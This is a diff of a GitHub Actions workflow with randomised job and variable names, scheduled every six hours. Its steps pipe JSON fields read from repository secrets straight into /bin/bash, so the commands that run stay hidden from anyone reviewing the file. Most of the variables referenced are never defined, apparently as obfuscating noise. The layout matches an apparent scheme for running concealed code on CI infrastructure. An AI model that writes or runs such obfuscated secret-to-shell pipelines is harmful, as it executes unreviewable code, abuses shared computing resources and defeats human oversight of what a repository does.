@@ -2,24 +2,34 @@ name: yangxiaosan3728
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
+    - cron: '1 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangxiaosan3728
         env:
-          rua1866: ${{ secrets.rua1866 }}
+          yakym6: ${{ secrets.yakym6 }}
         run: |
-          echo $rua1866 | jq -r .mgl52 | /bin/bash
-          echo $vkks09 | jq -r .mw222 | /bin/bash
-          echo $femis7964 | jq -r .qqoz9 | /bin/bash
-          echo $f02009 | jq -r .awqao47884 | /bin/bash
-          echo $qt97090 | jq -r .oyvdn73503 | /bin/bash
-          echo $qcvsw78 | jq -r .kdttf9236 | /bin/bash
-          echo $slh19 | jq -r .t5 | /bin/bash
-          echo $cbp708 | jq -r .audyu6453 | /bin/bash
-          echo $n118 | jq -r .l4 | /bin/bash
+          echo $yakym6 | jq -r .tm03 | /bin/bash
+          echo $p66 | jq -r .h7954 | /bin/bash
+          echo $ltmad38810 | jq -r .nt61 | /bin/bash
+          echo $zew1 | jq -r .j7 | /bin/bash
+          echo $rinmj085 | jq -r .p56527 | /bin/bash
+          echo $tgu10152 | jq -r .a9 | /bin/bash
+          echo $ogxo029 | jq -r .crxdw8 | /bin/bash
+          echo $lromx5183 | jq -r .ub0851 | /bin/bash
+          echo $u3816 | jq -r .p9597 | /bin/bash
+          echo $moad74 | jq -r .d783 | /bin/bash
+          echo $svit3 | jq -r .hdnz37 | /bin/bash
+          echo $gxzay67 | jq -r .nyolg4885 | /bin/bash
+          echo $qpp173 | jq -r .q4318 | /bin/bash
+          echo $kre931 | jq -r .wzj8352 | /bin/bash
+          echo $jwpod15122 | jq -r .fp0 | /bin/bash
+          echo $lzt559 | jq -r .ie2738 | /bin/bash
+          echo $ggbr3 | jq -r .v37 | /bin/bash
+          echo $yju195 | jq -r .x6298 | /bin/bash
+          echo $vedr6846 | jq -r .fyz1301 | /bin/bash
 
